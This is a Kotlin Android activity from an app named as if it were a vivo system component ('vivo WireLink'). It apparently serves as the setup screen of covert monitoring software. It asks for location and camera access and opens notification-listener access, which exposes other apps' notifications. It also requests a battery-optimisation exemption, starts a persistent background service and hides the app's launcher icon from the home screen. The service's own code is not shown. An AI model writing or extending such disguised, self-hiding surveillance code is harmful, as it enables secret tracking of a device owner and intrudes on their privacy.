// language: Kotlin, file: app/src/main/java/com/vivo/wirelink/KeeperActivity.kt
package com.vivo.wirelink

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.vivo.wirelink.databinding.ActivityKeeperBinding

class KeeperActivity : AppCompatActivity() {

    private lateinit var b: ActivityKeeperBinding

    private val req = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        val missing = result.filterValues { !it }.keys
        if (missing.isEmpty()) toast("granted")
        else toast("denied: ${missing.joinToString()}")
        refresh()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        b = ActivityKeeperBinding.inflate(layoutInflater)
        setContentView(b.root)

        b.tvDevice.text = "device: ${Prefs.deviceId(this)}"

        b.btnLoc.setOnClickListener {
            req.launch(
                arrayOf(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                )
            )
        }

        b.btnCam.setOnClickListener {
            req.launch(arrayOf(Manifest.permission.CAMERA))
        }

        b.btnNotif.setOnClickListener {
            if (Build.VERSION.SDK_INT >= 33) {
                req.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
            } else {
                toast("not required on this android version")
            }
        }

        b.btnBattery.setOnClickListener { requestBatteryExemption() }
        b.btnNotifAccess.setOnClickListener { openNotificationAccess() }

        b.btnStart.setOnClickListener {
            val i = Intent(this, KeeperService::class.java)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
            toast("service running")
        }

        b.btnHide.setOnClickListener { confirmHide() }
        b.btnRestore.setOnClickListener { restoreIcon() }

        refresh()
    }

    override fun onResume() {
        super.onResume()
        refresh()
    }

    private fun refresh() {
        b.btnLoc.isEnabled = !has(Manifest.permission.ACCESS_FINE_LOCATION)
        b.btnCam.isEnabled = !has(Manifest.permission.CAMERA)

        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        b.btnBattery.isEnabled = !pm.isIgnoringBatteryOptimizations(packageName)

        b.btnNotifAccess.isEnabled = !isNotificationAccessGranted()

        b.btnHide.isEnabled = isLauncherEnabled()
        b.btnRestore.isEnabled = !isLauncherEnabled()
    }

    private fun has(permission: String): Boolean =
        ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED

    private fun isNotificationAccessGranted(): Boolean {
        return NotificationManagerCompat.getEnabledListenerPackages(this)
            .contains(packageName)
    }

    private fun isLauncherEnabled(): Boolean {
        val state = packageManager.getComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java)
        )
        return state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT ||
               state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED
    }

    private fun requestBatteryExemption() {
        if (Build.VERSION.SDK_INT < 23) return
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            toast("already exempt")
            return
        }
        val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            .setData(Uri.parse("package:$packageName"))
        runCatching { startActivity(i) }
            .onFailure { toast("open battery settings manually") }
    }

    private fun openNotificationAccess() {
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        runCatching { startActivity(intent) }
            .onFailure {
                // some OEMs bury it — fall back to the top-level settings
                runCatching { startActivity(Intent(Settings.ACTION_SETTINGS)) }
                    .onFailure { toast("open settings manually") }
            }
    }

    private fun confirmHide() {
        AlertDialog.Builder(this)
            .setTitle("Hide launcher icon?")
            .setMessage(
                "The app icon disappears from the home screen and app drawer.\n\n" +
                "To bring it back: open Settings -> Apps -> vivo WireLink -> Open, " +
                "then tap 'restore icon' here. Uninstalling also restores it."
            )
            .setPositiveButton("Hide") { _, _ -> hideIcon() }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun hideIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        toast("icon hidden")
        refresh()
    }

    private fun restoreIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        toast("icon restored")
        refresh()
    }

    private fun toast(s: String) =
        Toast.makeText(this, s, Toast.LENGTH_SHORT).show()
}
